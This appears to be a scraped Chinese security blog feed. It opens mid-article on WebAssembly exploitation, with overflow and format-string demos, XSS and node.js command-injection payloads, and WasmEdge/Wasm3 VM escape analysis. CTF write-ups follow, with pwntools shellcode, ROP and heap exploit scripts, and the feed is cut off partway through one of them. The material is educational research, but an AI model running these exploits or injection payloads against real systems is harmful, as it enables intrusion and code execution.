memset(buf,0,100);   scanf(&quot;%s&quot;,buf);   printf(&quot;hello world: %s\\n&quot;,buf);   return 0;&#125;\n将得到的hello.wasm使用wabt项目中的wasm2wat转为S表达式./wasm2wat hello.wasm &gt; hello.watS-表达式是一个非常简单的用来表示树的文本格式，跟wasm二进制文件是简单的对应关系\n(module  (type (;0;) (func (param i32) (result i32)))  (import &quot;wasi_snapshot_preview1&quot; &quot;fd_write&quot; (func (;0;) (type 9)))  (func (;0;) (type 8)    i32.const 1    i32.const 2    i32.add    ....  )  (table (;0;) 9 9 funcref)  (memory (;0;) 256 256)  (global (;0;) (mut i32) (i32.const 65536))  (export &quot;memory&quot; (memory 0))  (elem (;0;) (i32.const 1) func 13 12 14 39 40 43 44 46)  (data (;0;) (i32.const 100) &quot;hello&quot;)  (start 0)))\n使用010-Editor打开hello.wasm文件，可以看到对应的结构\n\nS表达式和WASM二进制之间是简单的翻译关系。由于S表达式的比较容易理解，在逆向WASM时可以直接阅读S表达式。\n传统漏洞模式在WebAssembly中的变化格式化字符串编译代码emcc hello.c -s WASM&#x3D;1 -o hello.html\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() &#123;   char buf[100];   memset(buf,&#x27;a&#x27;,100);   printf(&quot;%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p\\n&quot;);   return 0;&#125;\n运行结果\n\n编译后查看S表达式，我们重点关注一下S表达式的import表，这是WASM用于导入外部函数、库函数用的，有点类似于ELF的GOT表，不同的是import表即可以导入WASM虚拟机实现的内部的库函数，还能导入用户用JS写的函数。\n(import &quot;wasi_snapshot_preview1&quot; &quot;fd_write&quot; (func (;0;) (type 9)))(import &quot;env&quot; &quot;emscripten_memcpy_js&quot; (func (;1;) (type 12)))(import &quot;wasi_snapshot_preview1&quot; &quot;fd_close&quot; (func (;2;) (type 0)))(import &quot;wasi_snapshot_preview1&quot; &quot;fd_read&quot; (func (;3;) (type 9)))(import &quot;env&quot; &quot;emscripten_resize_heap&quot; (func (;4;) (type 0)))(import &quot;wasi_snapshot_preview1&quot; &quot;fd_seek&quot; (func (;5;) (type 10)))\n在这里我们没有看到printf，该函数被编译进了WASM。通过测试，格式化字符串漏洞仍然存在，%p%p%p%p%p%p%p%p%p%p%p能够泄漏出一些数据，但是运行结果并未泄漏出栈上的buf，这跟printf在不同的WebAssembly编译器中实现有关。\n堆溢出#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void fun() &#123;   printf(&quot;fun\\n&quot;);&#125;void fun2() &#123;   printf(&quot;fun2\\n&quot;);&#125;typedef struct Node &#123;   void (*f)();   char buf[100];&#125; Node;int main() &#123;   char *p = (char* *)malloc(0x10);   Node *node = (Node *)malloc(sizeof(Node));   node-&gt;f = fun;   strcpy(node-&gt;buf,&quot;hello world\\n&quot;);   node-&gt;f();   printf(&quot;before ptr=%p,buf=%s\\n&quot;,node-&gt;f,node-&gt;buf);   memset(p,&#x27;a&#x27;,0x100);   printf(&quot;after ptr=%p,buf=%s\\n&quot;,node-&gt;f,node-&gt;buf);   node-&gt;f();   return 0;\n运行结果\n\n堆溢出仍然存在，可以覆盖堆中的数据。根据前面的介绍，WASM数据区不可能存储指针，因此结构体中的f函数指针实际上是一个偏移值，可以利用溢出覆盖偏移值，进而能够去执行其他的wasm函数。但是这里无法像汇编那样能够跳转到任意函数以及gadgets，这里只能跳转到在函数表(func表)中存储的函数。\n栈溢出#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void fun() &#123;   printf(&quot;fun\\n&quot;);&#125;void fun2() &#123;   printf(&quot;fun2\\n&quot;);&#125;typedef struct Node &#123;   void (*f)();   char buf[100];&#125; Node;int main() &#123;   Node node;   char buf[10];   node.f = fun;   strcpy(node.buf,&quot;hello world\\n&quot;);   node.f();   printf(&quot;before ptr=%p,buf=%s\\n&quot;,node.f,node.buf);   memset(buf,&#x27;a&#x27;,100);   printf(&quot;after ptr=%p,buf=%s\\n&quot;,node.f,node.buf);   node.f();   return 0;&#125;\n运行结果\n\n栈溢出与堆溢出类似，可以覆盖后方的一些数据结构，有函数指针的话可以覆盖函数的index，但是返回地址没有保存在数据栈中，因此不影响程序的返回执行。与汇编不同的是，WASM的栈空间溢出会把前面的变量覆盖，这是因为WASM开辟栈时是按照代码顺序来的，遇到node时，先压栈，遇到buf时，再压栈，这也就会导致buf在node的内存前面，可以覆盖到。\n数组越界#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main() &#123;   int x = 0;   char buf[16];   memset(buf,&#x27;a&#x27;,0x10);   size_t data[1];   for (int i=-100;i&lt;100;i++) &#123;      printf(&quot;%p\\n&quot;,data[i]);   &#125;   return 0;&#125;\n运行结果\n\n数组越界可以泄漏数据区的任何数据，但是只会限定在数据区，因为下标的上下限就是数据栈的边界，这种边界检查在对应的访存opcode的handler中会进行。\nWebAssembly的一些利用思路前端控制页面数据，可以构造XSS#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;emscripten.h&gt;int main() &#123;    char msg[100];    char buf[10];    strcpy(msg,&quot;alert(&#x27;Hello, world!&#x27;);&quot;);    scanf(&quot;%s&quot;,buf);    emscripten_run_script(msg);    return 0;&#125;\n输入aaaaaaaaaaalert(&#39;hacked&#39;);，可以将emscripten_run_script的参数覆盖，执行任意的JS代码。运行结果\n\n如结果所示，可以利用溢出覆盖一些能够执行JS脚本的函数的参数，当然也可以覆盖结构体中的函数偏移指向emscripten_run_script函数，并控制好参数去执行JS脚本。\n服务器端RCEWebAssembly不仅可以在浏览器中使用，还能够在服务器端被nodejs使用。与浏览器不同的是，nodejs可以支持系统操作API，例如system、open等函数，都能够在nodejs的WebAssembly中正常使用，那么就可以利用溢出等漏洞控制system的参数来达到命令执行编译以下代码emcc 1.c -o 1.js -s EXPORTED_FUNCTIONS=&quot;[&quot;_vuln&quot;]&quot; -s &quot;EXTRA_EXPORTED_RUNTIME_METHODS=[&#39;ccall&#39;]&quot;\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;emscripten.h&gt;int EMSCRIPTEN_KEEPALIVE vuln(char *p) &#123;    char msg[100];    char buf[10];    strcpy(msg,&quot;echo hello&quot;);    strcpy(buf,p);    system(msg);    return 0;&#125;\n在nodejs中调用\nconst m = require(&#x27;./1.js&#x27;);m.ccall(&#x27;vuln&#x27;,&#x27;int&#x27;,[&#x27;string&#x27;],[&#x27;aaaaaaaaaals /;echo hacked;&#x27;])\n运行结果\n\n还可以利用漏洞改写函数偏移，指向system并控制好参数，主动执行命令。或者是system函数参数部分可控，则可以命令注入。\n思路总结首先需要关注WebAssembly附带的js文件，看看里面写了哪些导入和导出函数，如果是在nodejs中的WebAssembly，要是导入函数中有一些能够操作系统的函数如system、open等，则重点关注，然后利用wasm2wat将wasm文件转换为wat S表达式，审计这些函数的参数是否存在或者可以注入等漏洞；要是有溢出漏洞，则看能否覆盖参数，或者覆盖函数偏移值。\nWebAssembly虚拟机逃逸在BlackHat USA 2022的议题上我们发表了一篇名为Is WebAssembly Really Safe? - WasmVMEscape andRCEVulnerabilities Have Been Found in New Way的议题，讲的就是WebAssembly的虚拟机逃逸。WebAssembly虚拟机逃逸漏洞重点关注三个方面：字节码的执行漏洞、WASM二进制结构解析漏洞、导入表库函数实现中的漏洞。 这三个关注的是虚拟机的本身而不是位于虚拟机里的WASM代码，因此又可以回到传统漏洞模式的思路。\nCVE-2022-48503漏洞信息位于Apple WebKit的Source/JavaScriptCore/wasm/WasmInstance.cpp中，对WebAssembly进行加载解析时，m_module-&gt;moduleInformation().dataSegmentsCount()的值未检查大小，是直接从WASM文件中读取的，从而导致dataSegmentIndex可以越界\nInstance::Instance(VM&amp; vm, JSGlobalObject* globalObject, Ref&lt;Module&gt;&amp;&amp; module)......    for (unsigned dataSegmentIndex = 0; dataSegmentIndex &lt; m_module-&gt;moduleInformation().dataSegmentsCount(); ++dataSegmentIndex) &#123;        const auto&amp; dataSegment = m_module-&gt;moduleInformation().data[dataSegmentIndex];        if (dataSegment-&gt;isPassive())            m_passiveDataSegments.quickSet(dataSegmentIndex);    &#125;......&#125;\n修复在Source/JavaScriptCore/wasm /WasmSectionParser.cpp文件中添加了一个检查auto SectionParser::parseDataCount() -&gt; PartialResult{&nbsp;&nbsp;&nbsp;&nbsp;uint32_t numberOfDataSegments;&nbsp;&nbsp;&nbsp;&nbsp;WASM_PARSER_FAIL_IF(!parseVarUInt32(numberOfDataSegments), “can’t get Data Count section’s count”);&nbsp;&nbsp;&nbsp;&nbsp;WASM_PARSER_FAIL_IF(numberOfDataSegments &gt; maxDataSegments, “Data Count section’s count is too big “, numberOfDataSegments , “ maximum “, maxDataSegments);&nbsp;&nbsp;&nbsp;&nbsp;m_info-&gt;numberOfDataSegments &#x3D; numberOfDataSegments;&nbsp;&nbsp;&nbsp;&nbsp;return { };}\nCVE-2022-28990WebAssembly的导入库函数是一个可研究的方向，导入函数可以从wasm转为S表达式后的import表中看到\n(import &quot;env&quot; &quot;system&quot; (func (;0;) (type 0)))(import &quot;wasi_snapshot_preview1&quot; &quot;fd_close&quot; (func (;1;) (type 0)))(import &quot;wasi_snapshot_preview1&quot; &quot;fd_read&quot; (func (;2;) (type 10)))(import &quot;env&quot; &quot;emscripten_resize_heap&quot; (func (;3;) (type 0)))(import &quot;env&quot; &quot;emscripten_memcpy_js&quot; (func (;4;) (type 13)))(import &quot;wasi_snapshot_preview1&quot; &quot;fd_seek&quot; (func (;5;) (type 12)))\n有的导入函数来自于JS层写的自定义函数，有点则来自于虚拟机自身实现的库函数。例如在上面我们看到system函数是从env导入的，而fd_read则是从wasi_snapshot_preview1导入的，对应的我们在js文件中看到\nvar wasmImports = &#123;  /** @export */  emscripten_memcpy_js: _emscripten_memcpy_js,  /** @export */  emscripten_resize_heap: _emscripten_resize_heap,  /** @export */  fd_close: _fd_close,  /** @export */  fd_read: _fd_read,  /** @export */  fd_seek: _fd_seek,  /** @export */  system: _system&#125;;function createWasm() &#123;  // prepare imports  var info = &#123;    &#x27;env&#x27;: wasmImports,    &#x27;wasi_snapshot_preview1&#x27;: wasmImports,  &#125;;...  instantiateAsync(wasmBinary, wasmBinaryFile, info, receiveInstantiationResult);...\n可以看到emcc生成的WASM JS接口文件同时指定了env和wasi_snapshot_preview1表。实际上wasi_snapshot_preview1库是WebAssembly System Interface(WASI)标准的库，WASI是一套系统API接口，拥有像fd_write、fd_read、sock_accept等系统函数，某些WebAssembly虚拟机会在内部实现自己的一套WASI，对于这种有自己实现WASI接口的WebAssembly虚拟机，在JS层就无需再去实现wasi_snapshot_preview1的导入函数。\nWasm3是一款能够在嵌入式设备上运行的WebAssembly虚拟机，在嵌入式设备上使用WebAssembly的优点是可以做到类似于Java一样的一次编译到处运行，无需考虑嵌入式设备的底层适配。\n\nWasm3内部实现了WASI标准，而漏洞则出现在库函数fd_write、fd_read中。\n# define m3ApiOffsetToPtr(offset)   (void*)((uint8_t*)_mem + (uint32_t)(offset))#  define m3ApiReadMem32(ptr)        m3_bswap32((* (uint32_t *)(ptr)))static inlinevoid copy_iov_to_host(void* _mem, struct iovec* host_iov, wasi_iovec_t* wasi_iov, int32_t iovs_len)&#123;    // Convert wasi memory offsets to host addresses    for (int i = 0; i &lt; iovs_len; i++) &#123;        host_iov[i].iov_base = m3ApiOffsetToPtr(m3ApiReadMem32(&amp;wasi_iov[i].buf));        host_iov[i].iov_len  = m3ApiReadMem32(&amp;wasi_iov[i].buf_len);    &#125;&#125;m3ApiRawFunction(m3_wasi_generic_fd_read)&#123;    m3ApiReturnType  (uint32_t)    m3ApiGetArg      (__wasi_fd_t          , fd)    m3ApiGetArgMem   (wasi_iovec_t *       , wasi_iovs)    m3ApiGetArg      (__wasi_size_t        , iovs_len)    m3ApiGetArgMem   (__wasi_size_t *      , nread)    m3ApiCheckMem(wasi_iovs,    iovs_len * sizeof(wasi_iovec_t));    m3ApiCheckMem(nread,        sizeof(__wasi_size_t));#if defined(HAS_IOVEC)    struct iovec iovs[iovs_len];    copy_iov_to_host(_mem, iovs, wasi_iovs, iovs_len);    ssize_t ret = readv(fd, iovs, iovs_len);......\n在函数copy_iov_to_host中，使用m3ApiOffsetToPtr对WASM字节码传过来的offset进行转换，即加上_mem的地址，得到要读取的目标地址，漏洞出现在没有对offset进行检查，可以传入任意的offset从而溢出_mem，实现任意地址写；同理，fd_write则可以实现任意地址读如下的POC读取了_mem + 0x10000处的数据\n\n\nOff by One in WasmEdge漏洞分析WasmEdge是另一款WebAssembly虚拟机\n\n在其迭代的开发版本中曾经出现过一个字节码的off by one漏洞。Executor::execute函数是WasmEdge解释执行WebAssembly字节码的函数\nExpect&lt;void&gt; Executor::execute(Runtime::StoreManager &amp;StoreMgr,                               Runtime::StackManager &amp;StackMgr,                               const AST::InstrView::iterator Start,                               const AST::InstrView::iterator End) &#123;  AST::InstrView::iterator PC = Start;  AST::InstrView::iterator PCEnd = End;  auto Dispatch = [this, &amp;PC, &amp;StoreMgr, &amp;StackMgr]() -&gt; Expect&lt;void&gt; &#123;    const AST::Instruction &amp;Instr = *PC;    switch (Instr.getOpCode()) &#123;    ......    case OpCode::Br:      return runBrOp(StackMgr, Instr, PC);   ...... &#125;;  while (PC != PCEnd) &#123;    OpCode Code = PC-&gt;getOpCode();    ......    if (auto Res = Dispatch(); !Res) &#123;      return Unexpect(Res);    &#125;    PC++;  &#125;......\n重点关注OpCode::Br指令的实现\nExpect&lt;void&gt; Executor::runBrOp(Runtime::StackManager &amp;StackMgr,                               const AST::Instruction &amp;Instr,                               AST::InstrView::iterator &amp;PC) noexcept &#123;  return branchToLabel(StackMgr, Instr.getJump().StackEraseBegin,                       Instr.getJump().StackEraseEnd, Instr.getJump().PCOffset,                       PC);&#125;Expect&lt;void&gt; Executor::branchToLabel(Runtime::StackManager &amp;StackMgr,                                     uint32_t EraseBegin, uint32_t EraseEnd,                                     int32_t PCOffset,                                     AST::InstrView::iterator &amp;PC) noexcept &#123;  // Check stop token  if (unlikely(StopToken.exchange(0, std::memory_order_relaxed))) &#123;    spdlog::error(ErrCode::Interrupted);    return Unexpect(ErrCode::Interrupted);  &#125;  StackMgr.stackErase(EraseBegin, EraseEnd);  PC += PCOffset;  return &#123;&#125;;&#125;\nbranchToLabel会把PC加上PCOffset，但是在Executor::execute的尾部还有一个PC++Expect Executor::execute(Runtime::StoreManager &amp;StoreMgr,                               Runtime::StackManager &amp;StackMgr,                               const AST::InstrView::iterator Start,                               const AST::InstrView::iterator End) {……  AST::InstrView::iterator PC &#x3D; Start;……  while (PC !&#x3D; PCEnd) {    OpCode Code &#x3D; PC-&gt;getOpCode();    ……    if (auto Res &#x3D; Dispatch(); !Res) {      return Unexpect(Res);    }    PC++;  }\n在某种情况下，auto Res = Dispatch()处理Br指令，将PC加上PCOffset，此时PC的值将等于PCEnd，但是循环还没结束，后面还有一条PC++语句，执行后，PC == PCEnd + 1，此后while (PC != PCEnd)将永远成立，那么就会继续读取PCEnd + 1处的数据结构来执行。\n漏洞利用WasmEdge在运行WASM时首先会进行解析编译，构造出两个栈，一个执行栈_pc stack，另一个则是数据栈_sp stack，_pc stack是在解析时生成的，字节码无法操作_pc stack，只能操作数据栈_sp stack，正如WebAssmebly标准定义的那样。_pc stack中的所有数据，例如下标，都是在解析时检查通过的，如果某个下标能够溢出数据栈，将在解析时被检查到，从而终止wasm的解析，进而也不会执行。\n\n漏洞的情况表现如下\n\n对于WebAssmebly虚拟机自己来说，PCEnd+1在_pc stack这块堆内存之外，如果能够在PCEnd + 1处布置自定义的数据，漏洞将得以利用。这是因为前面提到，PC栈里的数据都是经过检查的，这里再补充一条就是在运行时，这些Opcode的处理函数Handler将不会再次检查参数。例如global.set指令的处理函数如下\nExpect&lt;void&gt; Executor::runGlobalSetOp(Runtime::StackManager &amp;StackMgr,                                      uint32_t Idx) const noexcept &#123;  auto *GlobInst = getGlobInstByIdx(StackMgr, Idx);  assuming(GlobInst);  GlobInst-&gt;getValue() = StackMgr.pop();  return &#123;&#125;;&#125;Runtime::Instance::GlobalInstance *Executor::getGlobInstByIdx(Runtime::StackManager &amp;StackMgr,                           const uint32_t Idx) const &#123;......  return ModInst-&gt;unsafeGetGlobal(Idx);&#125;GlobalInstance *unsafeGetGlobal(uint32_t Idx) const noexcept &#123;    return GlobInsts[Idx];&#125;\nunsafeGetGlobal直接使用了从PC栈中获取的下标来读取数据，并不检查下标是否越界，因为在WASM解析时就已经做过了下标边界的检查，无需再检查。现在由于漏洞溢出的原因，PC将继续从后面的内存进行取值，而后面的内存我们是可以在一定程度上控制的，比如我们伪造一条global.set的指令结构体，并将Idx下标设置为我们想要的任意值，将能够实现任意地址写。\n我们可以使用i64.const来进行堆风水的布局\n\n这是因为运行时，此类opcode的处理就是向C++的vector中push一个新的数据，而vector是可以进行内存分配的，只要不断的压入数据，就能分配很多的内存。\ncase OpCode::I32__const:case OpCode::I64__const:case OpCode::F32__const:case OpCode::F64__const:  StackMgr.push(Instr.getNum());  return &#123;&#125;;\n因此我们在POC中写了很多的i64.const指令，最终的效果如下\n\n不幸的是End后面的内存并不完全可控，幸运的是我们能够控制End + 1的位置的第三个字段的值，查看指令结构体\nstruct Instruction &#123;      uint32_t JumpEnd;      uint32_t JumpElse;      BlockType ResType;      uint32_t Offset = 0;      OpCode Code;      struct &#123;         bool IsAllocLabelList : 1;         bool IsAllocValTypeList : 1;      &#125; Flags;&#125;;\n可控位置正好对应了指令结构体中的Code成员，也就是opcode能够任意指定，能够跳转到任何的opcode的handler中去执行，但是相关参数不可控制。一个好的思路是看能否执行某条Opcode Handler,将PC指向完全可控区。其中一条Else指令可以被利用\nExpect&lt;void&gt; Executor::execute(Runtime::StoreManager &amp;StoreMgr,......    case OpCode::Else:......      PC += PC-&gt;getJumpEnd();      [[fallthrough]];    case OpCode::End:      PC = StackMgr.maybePopFrame(PC);      return &#123;&#125;;......\n处理Else指令时，会将PC加上getJumpEnd()\n\n在内存中看到对应JumpEnd的位置数据为0x154，意味着我们可以让PC += 0x154，这已经足够让我们将PC指向可控区了。由于Instruction结构体的大小为32字节，而数据栈中的32字节的数据类型有v128.const i64x2，因此我们可以用v128.const i64x2来伪造整个Instruction结构体。最终的效果如下，在PCEnd+1处伪造一条Else指令，将PC转移到数据栈中，并执行伪造的一系列指令。\n\n例如global.get和global.set的伪造如下\ndef Global_Get(index):   global i   i += 2   code = &#x27;nop\\n&#x27;   code += &#x27;v128.const i64x2 %d 0\\n&#x27; % (index)   code += &#x27;nop\\n&#x27;   code += &#x27;v128.const i64x2 0x2300000000 0\\n&#x27;   return codedef Global_Set(index):   global i   i += 2   code = &#x27;nop\\n&#x27;   code += &#x27;v128.const i64x2 %d 0\\n&#x27; % (index)   code += &#x27;nop\\n&#x27;   code += &#x27;v128.const i64x2 0x2400000000 0\\n&#x27;   return codedef i32_const(value):   global i   i += 2   code = &#x27;nop\\n&#x27;   code += &#x27;v128.const i64x2 %d 0\\n&#x27; % (value)   code += &#x27;nop\\n&#x27;   code += &#x27;v128.const i64x2 0x4100000000 0\\n&#x27;   return code......\n通过设置index，能够实现任意地址读写，进而构造后续RCE。\n总结目前还很少爆出WebAssmebly相关产品的漏洞，或许未来会有更多使用WebAssmebly的产品，本文为其研究提供了一种思路。对代码本身的漏洞，在WebAssmebly里会受到限制进而导致传统漏洞模式变得难以利用，但是仍然具有挖掘的方面。对于WebAssmebly虚拟机，不同的厂商可能实现不一样，可以针对其中的数据结构解析、指令执行、导入函数的底层实现入手，挖掘虚拟机本身的漏洞进而达到虚拟机逃逸控制主机的目的。\n参考WebAssembly完全入门——了解wasm的前世今身编译 C&#x2F;C++ 为 WebAssembly理解 WebAssembly 文本格式us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web-wpus-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Webus-18-Silvanovich-The-Problems-and-Promise-of-WebAssemblyEverything Old is New Again: Binary Security of WebAssemblyUS-22-Hai-Is-WebAssembly-Really-Safe-wpUS-22-Hai-Is-WebAssembly-Really-SafeWASI API\n","categories":["安全研究"],"tags":["解释器/简易虚拟机","wasm"]},{"title":"ZJCTF_2019_Mesage(地址值强制当成指令)","url":"/2020/06/11/ZJCTF_2019_Mesage/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，在edit功能里没有检查index，可以溢出，在任意地址处写一个堆地址。\n\n\n那么，我们就可以把堆地址写到已存在的堆里，然后调用show就能打印出堆地址，然后，我们计算new的got表到堆地址之间的偏移，将new的got表改为一个堆地址。但是这个堆地址里面开始并不是存放shellcode，而是存放着一个堆指针。\n\n\n通过构造堆，让堆末尾的地址为0xE8，这样，就可以解决问题了，因为0xE8强制转为指令就是这样\n\n\n因此，我们只要在后方申请一个很大的堆，并在前方大片空间里填充nop，那么就一定可以滑行到主shellcode里\n\n\n#coding:utf8from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)sh = process(&#x27;./message1&#x27;)#sh = remote(&#x27;node3.buuoj.cn&#x27;,25086)new_got = 0x00000000006040F0def add(count,string):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;add?&#x27;,str(count))   for i in range(count):      sh.sendlineafter(&#x27;message&#x27;,string)def delete(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))def show():   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)def edit(index,count,string):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))   sh.sendlineafter(&#x27;add?&#x27;,str(count))   for i in range(count):      sh.sendlineafter(&#x27;message&#x27;,string)add(1,&#x27;a&#x27;*0x8)edit(-3,1,&#x27;a&#x27;*0x8)show()sh.recvuntil(&#x27;0:&#x27;)sh.recvuntil(&#x27;0:&#x27;)heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;heap_addr=&#x27;,hex(heap_addr)offset = (heap_addr - 0x20 - new_got) / 8edit(0,4,&#x27;\\x00&#x27;*0x18)edit(0,1,&#x27;\\x00&#x27;*0x18)#new_got-&gt;chunk1[call xxx]-&gt;chunk2edit(-1*offset,1,(asm(shellcraft.sh())).rjust(0x10000,&#x27;\\x90&#x27;))#getshellsh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)sh.sendlineafter(&#x27;add?&#x27;,&#x27;1&#x27;)sh.interactive()","categories":["CTF"],"tags":["shellcode","下标越界"]},{"title":"Angr求解CTF逆向问题","url":"/2020/02/26/angr%E6%B1%82%E8%A7%A3%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/","content":"Angr求解CTF逆向问题\n以i春秋2020新春战役EasyVM为例，我们用IDA分析一下\n\n\n是一个模拟VM计算flag的程序，如果我们人工去推算，分析，再写个程序求解，太费时间，于是，我们使用angr来求解\n#coding:utf8  import angr  import claripy    base=0x400000  proj = angr.Project(&quot;./EasyVM&quot;,auto_load_libs=False)  st = proj.factory.entry_state()  simgr = proj.factory.simulation_manager(st)  #0xB73是正确的分支,0xB81是错误的分支  simgr.explore(find=base+0xB73,avoid=base+0xB81) #find就是正确的那条路 avoid错误的    print (simgr.found[0].posix.dumps(0)) #flag \n\n1分钟不到，即可求得解\n","categories":["CTF"],"tags":["angr","逆向"]},{"title":"arr_sun_2016(从下标上溢跑到下标下溢)","url":"/2020/06/11/arr_sun_2016/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，v2为有符号数，因此，这里存在下标越界的漏洞，但是是向上越界。\n\n\n看似只能向上越界，实际，我们可以利用整数溢出，来达到劫持栈里的返回地址处。\n\n\n列出等式\nint(ebp+eax*4-0x30) &#x3D; int(ebp + 0x4)\n求解得到int(4*eax) &#x3D; 0x34\n满足条件的eax有多个，我们取eax&#x3D;0x8000000D\n\n\n这样，就可以劫持到返回地址处，做rop了。\n#coding:utf8from pwn import *#sh = process(&#x27;./arr_sun_2016&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,28197)scanf = 0x08048460format_str = 0x0804882Fbss = 0x08049B30backdoor = 0x0804857Bpop_2 = 0x080487bash.sendlineafter(&#x27;What should I call you?&#x27;,&#x27;haivk&#x27;)def getIndex(offset):   return str(0x8000000d-0x100000000 + offset)def writeROP(rop):   i = 0   for item in rop:      sh.sendlineafter(&#x27;enter index&#x27;,getIndex(i))      sh.sendlineafter(&#x27;enter value&#x27;,str(item))      i = i + 1rop = [scanf,pop_2,format_str,bss,backdoor,0,bss,0,0,0]writeROP(rop)sh.sendline(&#x27;/bin/sh\\x00&#x27;)sh.interactive()","categories":["CTF"],"tags":["ROP","整数溢出"]},{"title":"babyfengshui","url":"/2019/11/06/babyfengshui/","content":"本题，首先，为了方便调试，我们需要解决alarm clock问题\n\n\n程序运行几十秒后就会自动退出，所以，为了方便调试，我们需要先修改一下这个二进制\n\n\n我们用十六进制编辑器把这几个指令nop(0x90)掉即可\n然后，我们就开始做题了\n查看创建功能的函数\n\n\n这里创建了两个堆，第一个堆用来存储description，第二个堆用来存储第一个堆的指针以及name字符串\n其数据结构大概是这样的\n\n\n创建的时候，大概是这样的\nchar * description = (char *)malloc(n);  memset(description,0,n);  Node * node = (Node *)malloc(0x80);  memset(node,0,0x80);  node-&gt;description = description;  \n即我们每次创建时，都会malloc两个堆，按照常规思想的情况，我们会以为它们在物理位置上相邻。但是会有例外情况发生。\n让我们看看，这个程序是如何检测堆是否会溢出的\n\n\n翻译过来，是这样的\nif (node-&gt;description + n &gt;= node-4) &#123;     //溢出  &#125;  \n\n为什么这样判断？\n这种判断只试用于description和node两个堆相邻的情况，如果description和和node两个堆不相邻，并且description在node的前面某地址处，那么就可以绕过这个检查，我们就能溢出堆了。\n假如我们先create三次,并且我们设置的大小为0x80，此时，堆的布局如下\n\n\n现在我们删除节点0，堆的布局如下\n\n\n现在我们再create一个0x100节点后，堆的布局如下\n\n\n这样，堆溢出的那个if不再有效，我们可以在description2输入数据，直到溢出到堆node2的地方。那么，我们就可以修改中间的这些堆的信息。\n原理是什么？请看glibc内存管理机制\n释放的内存块存储在bins里面，当申请时，会先从bins里找空闲的空间，如果找不到，再从TOP块切割一块给用户。并且，释放时，如果两块区域物理相邻，会发生合并，因此两块0x80的空间合并成了0x100的空间，当我们申请0x100空间的堆时，正好就分配到这个地方。\n现在，我们的目的是修改堆node1里的description指针，我们改成free的got表地址，那么当我们输出description的内容时，就会输出free的地址，因为我们让它指向的是free的got表地址。这样我们就能泄露free的加载地址。\n然后获得libc加载地址，获得system的地址。\n然后我们编辑node1的description内容，相当于编辑free的got表内容，我们把它改成system的地址。这样，当我们调用free的时候，就是调用system。我们事先把&#x2F;bin&#x2F;sh输入到堆2中。那么我们delete(2)的时候，就getshell了。\n我们的exp脚本\n#coding:utf8  from pwn import *  from LibcSearcher import *    #sh = process(&#x27;./babyfengshui1&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,50469)  elf = ELF(&#x27;./babyfengshui1&#x27;)  #libc = elf.libc    def create(size,name,textLen,content):     sh.sendlineafter(&#x27;Action:&#x27;,&#x27;0&#x27;)     sh.sendlineafter(&#x27;size of description:&#x27;,str(size))     sh.sendlineafter(&#x27;name:&#x27;,name)     sh.sendlineafter(&#x27;text length:&#x27;,str(textLen))     sh.sendafter(&#x27;text:&#x27;,content)    def delete(index):     sh.sendlineafter(&#x27;Action:&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;index:&#x27;,str(index))      def show(index):     sh.sendlineafter(&#x27;Action:&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;index:&#x27;,str(index))      def edit(index,textLen,content):     sh.sendlineafter(&#x27;Action:&#x27;,&#x27;3&#x27;)     sh.sendlineafter(&#x27;index:&#x27;,str(index))     sh.sendlineafter(&#x27;text length:&#x27;,str(textLen))     sh.sendafter(&#x27;text:&#x27;,content)    #经过分析，程序有这样一个结构  &#x27;&#x27;&#x27;结构体 typedef struct Node &#123;    void *description;    char name[0x80-4]; &#125; Node;  当我们create(n)时 先是 char *description = (char *)malloc(n); memset(description,0,n); Node * node = (Node *)malloc(sizeof(Node)); memset(node,0,0x80); node-&gt;description = description;  当我们删除时 先free Node里面的，再free Node free(node-&gt;description); free(node); 程序是这样检测堆是否溢出的，假如我们输入n if (node-&gt;description + n &gt;= node-4) &#123;     //堆溢出 &#125; 为什么这么判断？这是因为按照正常情况，这两个堆先后分配,如果之前没有free过其他堆，这两个堆会相邻 并且description堆先分配，在前面 而node堆后分配，在description后面 32位程序堆的结构如下 prev_size:4 bytes    size:4 bytes data:xxxxxxxxxxxxxxx 考虑到空间公用的情况(当申请空间的大小为4的奇数倍时，会将下一个堆的prev_size当成本堆的data区使用)，prev_size会被前一个堆共用 我们malloc返回的指针是指向data区的data - 4 就是前一个堆的结尾 因此，看似这个检查很完美 然后，考虑到内存分配机制，如果我们之前free掉两个的堆，然后申请大于其中一个堆大小的空间，那么首先 char *description = (char *)malloc(n);会返回第一个free掉的堆的地址 然后，由于n大于大于第一个堆的空间，这样，在分配0x80大小的结构体堆时，相邻空间不够，即内存管理程序在对应的bin找不到合适的块 于是，从top块分出一块区域给它 &#x27;&#x27;&#x27;    